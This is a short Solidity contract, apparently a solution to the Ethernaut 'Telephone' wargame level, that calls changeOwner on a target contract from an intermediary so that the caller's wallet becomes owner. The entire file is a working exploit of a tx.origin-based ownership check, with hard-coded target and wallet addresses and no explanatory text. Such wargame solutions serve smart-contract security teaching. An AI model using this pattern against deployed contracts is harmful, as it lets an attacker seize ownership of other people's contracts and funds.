// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _address) external;
}

contract Attack {
   
    address target = 0xf7a651D644a0085A463F602d5d23F5D987caB79A; //Put the Instance address

    constructor() {
    }

    function attack() public {
        address _address = 0x6F8807EB742CCad1933DBd5C1e811848504D1554; //You're Wallet Address
        
        Telephone(target).changeOwner(_address);
        

    }
}


